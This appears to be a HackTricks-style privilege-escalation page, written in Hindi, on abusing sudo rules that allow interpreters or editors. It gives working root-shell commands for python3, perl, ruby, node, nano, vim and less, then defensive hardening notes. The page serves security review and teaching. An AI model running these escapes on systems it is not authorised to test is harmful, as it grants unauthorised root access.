# Sudo Command Abuse

## Sudo-allowed interpreters

यदि `sudo -l` किसी user को root के रूप में कोई interpreter चलाने की अनुमति देता है, तो इसे direct code execution मानें। Interpreters arbitrary code execute करने के लिए बनाए गए हैं, इसलिए `python3`, `perl`, `ruby`, `lua`, `node` या इसी तरह के binaries को अनुमति देने वाला rule आमतौर पर root command execution के बराबर होता है, जब तक कि arguments को सख्ती से constrain और validate न किया गया हो।<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)[[9]](#references)[[11]](#references)</sup>

सामान्य review flow: पहले user के privileges की सूची बनाएं, फिर interpreter के `-c` option के साथ Python statement execute करें।<sup>[[1]](#references)[[3]](#references)[[4]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/python3 -c 'import os; os.system("id")'
sudo /usr/bin/python3 -c 'import os; os.system("/bin/sh")'
```
अन्य interpreter के उदाहरण नीचे दिए गए हैं; सूचीबद्ध interpreter inline-code execution या child-process APIs का documentation प्रदान करते हैं।<sup>[[5]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>
```bash
sudo /usr/bin/perl -e 'exec "/bin/sh";'
sudo /usr/bin/ruby -e 'exec "/bin/sh"'
sudo /usr/bin/node -e 'require("child_process").spawn("/bin/sh", {stdio: [0,1,2]})'
```
सटीक path महत्वपूर्ण है। यदि sudo rule `/usr/bin/python3` की अनुमति देता है, तो validation के दौरान उसी exact path का उपयोग करें।<sup>[[2]](#references)</sup>
```bash
sudo /usr/bin/python3 -c 'import os; os.setuid(0); os.setgid(0); os.system("/bin/sh")'
```
## Sudo-allowed editors

यदि `sudo -l` किसी user को root के रूप में interactive editor चलाने की अनुमति देता है, तो इसे harmless file-editing permission नहीं, बल्कि command-execution surface मानें। Editors अक्सर shell commands execute कर सकते हैं, arbitrary files read या write कर सकते हैं, या editor के भीतर से external helpers invoke कर सकते हैं।<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

Common review flow: पहले user के privileges list करें, फिर sudo के अंतर्गत प्रत्येक allowed editor या pager invoke करें।<sup>[[1]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>
```bash
sudo -l
sudo /usr/bin/nano /etc/hosts
sudo /usr/bin/vim /etc/hosts
sudo /usr/bin/less /etc/hosts
```
### Nano command execution

जब `nano` को sudo के माध्यम से अनुमति दी जाती है, तो editor interface से command execution संभव हो सकता है।<sup>[[12]](#references)</sup>
```text
Ctrl+R
Ctrl+X
```
फिर nano command prompt में `id` या `/bin/sh` जैसी कोई command दें।<sup>[[12]](#references)</sup>
```bash
id
/bin/sh
```
यदि किसी interactive shell के पास उपयोग करने योग्य terminal streams नहीं हैं, तो redirection का यह रूप उसके standard output और error को descriptor 0 पर map करता है।<sup>[[15]](#references)</sup>
```bash
reset; /bin/sh 1>&0 2>&0
```
सटीक key sequence nano के version और build options के अनुसार अलग हो सकता है, लेकिन security issue वही रहता है: editor root के रूप में चल रहा है और external commands invoke कर सकता है।<sup>[[1]](#references)[[12]](#references)</sup>

### अन्य सामान्य editor escapes

Vim-style editors आमतौर पर `:!` के माध्यम से command execution उपलब्ध कराते हैं।<sup>[[13]](#references)</sup>
```text
:!/bin/sh
```
`less` जैसे Pagers shell execution को भी expose कर सकते हैं।<sup>[[14]](#references)</sup>
```text
!/bin/sh
```
## Defensive notes

- sudo के माध्यम से interpreters या interactive editors देने से बचें।<sup>[[1]](#references)</sup>
- ऐसे fixed, root-owned wrappers को प्राथमिकता दें जो एक संकीर्ण administrative action करते हों।<sup>[[1]](#references)[[2]](#references)</sup>
- यदि interpreter अपरिहार्य हो, तो exact script path को restrict करें और user-controlled arguments, writable imports, `PYTHONPATH`, तथा unsafe environment preservation को रोकें।<sup>[[2]](#references)[[3]](#references)[[4]](#references)</sup>
- यदि file editing आवश्यक हो, तो exact file path को restrict करें और patched sudo versions तथा strict environment handling के साथ `sudoedit` का उपयोग करने पर विचार करें।<sup>[[1]](#references)[[2]](#references)</sup>
- `SETENV`, `env_keep`, writable working directories, writable module/import paths, `NOEXEC`, `use_pty`, और logging की समीक्षा करें, लेकिन इन्हें complete sandbox न मानें।<sup>[[1]](#references)[[2]](#references)[[3]](#references)</sup>

## References

- [1] [sudo(8) — Linux manual page](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [2] [sudoers(5) — Linux manual page](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [3] [Command line and environment — Python documentation](https://docs.python.org/3/using/cmdline.html)
- [4] [os — Miscellaneous operating system interfaces — Python documentation](https://docs.python.org/3/library/os.html)
- [5] [perlrun — how to execute the Perl interpreter](https://perldoc.perl.org/perlrun)
- [6] [exec — Perl documentation](https://perldoc.perl.org/functions/exec)
- [7] [Ruby command-line options](https://ruby-doc.org/3.4/ruby/options_md.html)
- [8] [Kernel — Ruby documentation](https://ruby-doc.org/3.4/Kernel.html)
- [9] [Command-line API — Node.js documentation](https://nodejs.org/api/cli.html)
- [10] [Child process — Node.js documentation](https://nodejs.org/api/child_process.html)
- [11] [Lua 5.4 lua man page](https://www.lua.org/manual/5.4/lua.html)
- [12] [The GNU nano text editor](https://nano-editor.org/manual.html)
- [13] [Vim: usr_21.txt](https://vimhelp.org/usr_21.txt.html)
- [14] [less(1) — Linux manual page](https://man7.org/linux/man-pages/man1/less.1.html)
- [15] [Redirections — Bash Reference Manual](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
{{#include ../../banners/hacktricks-training.md}}
